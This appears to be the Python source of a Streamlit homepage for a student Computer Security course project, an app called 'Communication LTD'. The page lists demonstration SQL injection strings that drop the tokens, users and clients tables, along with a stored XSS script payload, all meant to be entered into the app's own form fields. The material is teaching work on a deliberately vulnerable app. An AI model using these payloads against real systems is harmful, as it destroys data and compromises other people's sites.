from config.sidebar import init_page

import streamlit as st
import os

BACKEND_URL = os.getenv('BACKEND_URL')

st.set_page_config(page_title="Homepage", page_icon=":smiley:")

init_page(st)

st.image("https://i.ibb.co/tKm1VRH/comunication-ltd.png")

st.title("Welcome to Communication LTD")

st.markdown("""
    We're thrilled you've landed on our website,   
    the brainchild of our awesome team's final assignment for the Computer Security course.  

    Here at Communication LTD,  
    we've got your back when it comes to all things communication and security!
    
    ### Vulnerabilities:
    Make sure to set security mode to low.
    ##### SQL Injection:
    1) In page REGISTER -> type in **username** input: 
        ```sql
        1' OR 'a'='a'; drop table 'tokens' --
        ```
    2) In page LOGIN -> type in **username** input: 
        ```sql
        a' OR '1'='1'; drop table 'users' --
        ```
    3) In page SYSTEM -> type in **city** input:
        ```sql
        w'); drop table 'clients' --
        ```
    ##### Stored XSS:
    1) In page SYSTEM -> type in **name**/**city** input:
        ```html
        <script>alert("XSS MUAHAHAHAHA 😈")</script>
        ```

""")